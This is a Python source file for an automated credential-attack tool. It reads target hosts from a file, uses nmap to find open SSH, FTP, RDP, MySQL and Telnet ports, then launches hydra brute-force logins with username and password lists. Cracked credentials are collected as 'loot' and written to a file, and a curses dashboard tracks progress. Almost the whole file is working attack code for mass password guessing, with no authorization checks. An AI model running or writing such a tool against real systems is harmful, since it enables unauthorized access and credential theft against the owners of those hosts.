import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import curses
import datetime
from threading import Semaphore, Lock


def toggle_service_parallelism():
    """Toggle the service parallelism flag."""
    global service_parallelism_enabled
    service_parallelism_enabled = not service_parallelism_enabled
    print(f"Service Parallelism {'Enabled' if service_parallelism_enabled else 'Disabled'}")
# Semaphore to limit the number of concurrent hosts being processed
max_concurrent_hosts = 1  # Set to desired maximum concurrent hosts
service_parallelism_enabled = False 
host_semaphore = Semaphore(max_concurrent_hosts)

# List of services to test and their corresponding ports
test_services = {
    'ssh': 22,
    'ftp': 21,
    'rdp': 3389,
    'mysql': 3306,
    'telnet': 23,
    'sftp': 22,
}

# Keeps track of the found credentials to prevent duplicates
found_credentials = {}




# Mutex to safely update active thread count across threads
active_threads_lock = Lock()
active_threads_count = 0
def get_open_ports_nmap(target, log_win):
    """Use nmap to detect open ports for the specified services on the target."""
    try:
        log_win.addstr(f"Scanning {target} for open ports...\n", curses.color_pair(1))
        log_win.refresh()

        result = subprocess.run([ 
            'nmap', '-p', ','.join(map(str, test_services.values())), '--open', '-T4', target, '-oG', '-'
        ], capture_output=True, text=True)
        open_ports = []
        for line in result.stdout.splitlines():
            if 'Ports:' in line:
                ports_info = line.split('Ports:')[1].strip()
                port_entries = ports_info.split(',')
                for port_info in port_entries:
                    try:
                        port, state = port_info.split('/')[0:2]
                        if state == 'open':
                            open_ports.append(int(port))
                    except ValueError:
                        continue

        log_win.addstr(f"Open ports on {target}: {open_ports}\n", curses.color_pair(2))
        log_win.refresh()
        return open_ports
    except Exception as e:
        log_win.addstr(f"Error scanning {target}: {e}\n", curses.color_pair(3))
        log_win.refresh()
        return []

def test_service(target, service, port, log_win, log_file, progress_data):
    """Attempt to test service authentication with credential list."""
    log_win.addstr(f"Testing {service} on {target}:{port}...\n", curses.color_pair(1))
    log_win.refresh()

    command = []
    if service == 'ssh':
        command = ['hydra', '-L', 'usernames.txt', '-P', 'passwords.txt', '-o', log_file, f'ssh://{target}:{port}']
    elif service == 'ftp':
        command = ['hydra', '-L', 'usernames.txt', '-P', 'passwords.txt', '-o', log_file, f'ftp://{target}:{port}']
    elif service == 'rdp':
        command = ['hydra', '-L', 'usernames.txt', '-P', 'passwords.txt', '-o', log_file, f'rdp://{target}:{port}']
    elif service == 'mysql':
        command = ['hydra', '-L', 'usernames.txt', '-P', 'passwords.txt', '-o', log_file, f'mysql://{target}:{port}']
    elif service == 'telnet':
        command = ['hydra', '-L', 'usernames.txt', '-P', 'passwords.txt', '-o', log_file, f'telnet://{target}:{port}']

    try:
        subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Suppress Hydra output
        
        # Parse results and save any findings
        credentials = parse_hydra_output(log_file)
        if credentials:
            save_loot(target, service, credentials, progress_data)
            log_win.addstr(f"Valid credentials found for {service} on {target}:{port}\n", curses.color_pair(2))
            
    except Exception as e:
        log_win.addstr(f"Error during test on {target}:{port}: {e}\n", curses.color_pair(3))
        
    log_win.addstr(f"Testing completed for {service} on {target}:{port}\n", curses.color_pair(2))
    log_win.refresh()

def parse_hydra_output(log_file):
    """Parse output file for valid credentials"""
    credentials = []
    try:
        with open(log_file, 'r') as f:
            for line in f:
                if "login:" in line and "password:" in line:
                    # Format the output to match our criteria for storing
                    cred_line = line.strip()
                    credentials.append(cred_line)
    except Exception as e:
        print(f"Error parsing log file: {e}")
    return credentials


def save_loot(target, service, credentials, progress_data):
    """Save discovered credentials to loot file, ensuring no duplicates."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Initialize the set for the target if it does not exist
    if target not in found_credentials:
        found_credentials[target] = set()  # Use a set to prevent duplicates
    
    # Add credentials only if they aren't already present
    for cred in credentials:
        found_credentials[target].add(cred)  # Add the credential to the set

    # Update the loot count with the unique credentials for the target
    progress_data['loot_count'] = sum(len(v) for v in found_credentials.values())

def update_active_threads(increment):
    """Update the active threads count safely."""
    global active_threads_count
    with active_threads_lock:
        active_threads_count += increment

def progress_update(progress_win, progress_data):
    """Update the progress display and show stats in a box, side by side."""
    progress_win.clear()
    max_y, max_x = progress_win.getmaxyx()

    # Check if the terminal has enough space for the layout
    if max_y < 3 or max_x < 50:
        progress_win.addstr(0, 0, "Terminal too small! Resize to view progress.", curses.color_pair(3))
        progress_win.refresh()
        return

    # Draw a box around the progress area
    box_start_x = 0
    box_start_y = 0
    box_width = max_x - 1  # Leave space for the box border
    box_height = 4  # The height of the box

    # Create the box with border
    progress_win.border(0, 0, 0, 0, 0, 0, 0, 0)

    # Side-by-side progress information
    progress_win.addstr(1, 1, f"Hosts: {progress_data['hosts_completed']}/{progress_data['total_hosts']}", curses.color_pair(1))
    progress_win.addstr(1, box_width // 3, f"Services: {progress_data['services_completed']}/{progress_data['total_services']}", curses.color_pair(2))
    progress_win.addstr(1, 2 * box_width // 3, f"Loot: {progress_data['loot_count']} entries", curses.color_pair(1))
    progress_win.addstr(2, 1, f"Active Threads: {active_threads_count}/{max_concurrent_hosts}", curses.color_pair(1))
    progress_win.addstr(3, 1, "Press Ctrl+D to exit after completion.", curses.color_pair(1))

    # Refresh the window to display the updates
    progress_win.refresh()

def process_target(target, log_win, progress_win, progress_data):
    """Process the target by checking for open ports and testing services."""
    # Acquire the semaphore to limit concurrent host processing
    with host_semaphore:
        update_active_threads(1)  # Increment active thread count
        log_file = f'testing_output_{target.strip()}.log'
        open_ports = get_open_ports_nmap(target, log_win)

        if open_ports:
            service_ports = {service: port for service, port in test_services.items() if port in open_ports}

            if 22 in open_ports and 'sftp' in service_ports:
                del service_ports['sftp']  # Avoid duplicate testing of port 22

            progress_data['total_services'] += len(service_ports)
            progress_update(progress_win, progress_data)

            if service_parallelism_enabled:
                # Run services in parallel if parallelism is enabled
                with ThreadPoolExecutor() as executor:
                    futures = []
                    for service, port in service_ports.items():
                        futures.append(executor.submit(test_service, target, service, port, log_win, log_file, progress_data))

                    for future in as_completed(futures):
                        future.result()
                        progress_data['services_completed'] += 1
                        progress_update(progress_win, progress_data)
            else:
                # Run services sequentially if parallelism is disabled
                for service, port in service_ports.items():
                    test_service(target, service, port, log_win, log_file, progress_data)
                    progress_data['services_completed'] += 1
                    progress_update(progress_win, progress_data)
        else:
            log_win.addstr(f"No open ports found on {target}.\n", curses.color_pair(2))
            log_win.refresh()

        progress_data['hosts_completed'] += 1
        progress_update(progress_win, progress_data)

        update_active_threads(-1)  # Decrement active thread count once the target is done

def main(stdscr):
    """Main function to handle the curses interface."""
    # Initialize colors and other curses settings
    curses.start_color()
    curses.init_pair(1, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_RED, curses.COLOR_BLACK)

    stdscr.clear()
    stdscr.refresh()

    # Create windows for logging and progress
    log_win = curses.newwin(curses.LINES - 4, curses.COLS, 0, 0)
    progress_win = curses.newwin(4, curses.COLS, curses.LINES - 4, 0)

    # Initialize loot file
    with open('loot.txt', 'w') as f:
        f.write(f"=== Security Test Results - Started at {datetime.datetime.now()} ===\n")

    # Read targets
    with open('targets.txt', 'r') as f:
        targets = list(set(target.strip() for target in f.readlines()))

    progress_data = {
        'total_hosts': len(targets),
        'hosts_completed': 0,
        'total_services': 0,
        'services_completed': 0,
        'loot_count': 0
    }

    progress_update(progress_win, progress_data)

    # Process targets with thread pool and semaphore control
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(process_target, target, log_win, progress_win, progress_data) for target in targets]
        for future in as_completed(futures):
            future.result()

    # Write all loot at once after processing all targets
    with open('loot.txt', 'a') as f:
        for target, creds in found_credentials.items():
            f.write(f"\n=== Found at {datetime.datetime.now()} ===\n")
            f.write(f"Target: {target}\n")
            f.write("Credentials found:\n")
            for cred in creds:
                f.write(f"{cred}\n")
            f.write("="*40 + "\n")

    # Main loop to wait for Ctrl+D or other key input to exit
    while True:
        # Listen for Ctrl+D to exit
        key = stdscr.getch()
        if key == 4:  # 4 is the ASCII code for Ctrl+D
            break
        elif key == ord('p'):  # Press 'p' to toggle parallelism
            toggle_service_parallelism()

    # No need to explicitly call curses.endwin() because curses.wrapper does it automatically

# Start the curses application
curses.wrapper(main)